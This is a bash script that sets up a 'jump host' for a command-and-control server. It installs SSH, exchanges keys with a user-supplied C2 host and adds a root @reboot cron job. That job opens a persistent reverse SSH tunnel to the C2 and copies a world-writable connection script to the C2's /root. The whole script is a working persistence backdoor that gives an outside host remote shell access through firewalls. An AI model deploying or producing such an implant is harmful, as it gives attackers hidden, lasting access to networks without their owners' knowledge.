#!/bin/bash

#Check for connectivity
echo "### Checking For Internet ###"
if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
    echo "IPv4 is up"
    printf "\n"

#Installing deps
    echo "### Installing Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install openssh-server
    printf "\n"

#Starting openssh as a service
    echo "### Checking For SSH Status ### "
    if (systemctl -q is-active sshd.service)
    then
       echo "### SSH is Installed And Running ###"
    else
       echo "### Starting SSH Service & Enabling On Reboot ###" 
       sudo systemctl start ssh && sudo systemctl enable ssh
    fi
    printf "\n"

#Generate key
    echo "### Generating 4096 keypair ###"
    ssh-keygen -b 4096
    printf "\n"

#Read input from user
    echo "Please Enter Your Local Username"
    echo "You will use this user's account to log in from your C2!"
    read user

#Error checking for user input
    until id "$user" >/dev/null; do
        echo "Please Enter Your Local Username";
        read user;
    done
    printf "\n"

    echo "please enter route to desired C2 (<username>@<C2 host>)"
    read C2
    printf "\n"

#transfer local key to C2
    echo "### Copying Key To C2 Host ###"
    ssh-copy-id $C2
    printf "\n"

#generating a remote ssh key
   ssh $C2 'ssh-keygen'

#Setup cron job
    echo "### Setting Up Cronjob ###"
    sudo crontab -l > cronsh
    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2} && sudo -u ${user} printf 'ssh ${user}@localhost -p 43022' > /home/${user}/hmu.sh && chmod 777 /home/${user}/hmu.sh && sudo -u ${user} scp /home/${user}/hmu.sh ${C2}:/root" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"

    echo "### donezo! ###"
    printf "\n"

    echo "### Please Reboot the Jump Host ###"

    #Set up reverse tunnel
#    sudo -u $user /usr/bin/tmux send-keys -t ssh "ssh -R 43022:localhost:22 ${varname}" enter

else
    echo "IPv4 is down"

fi
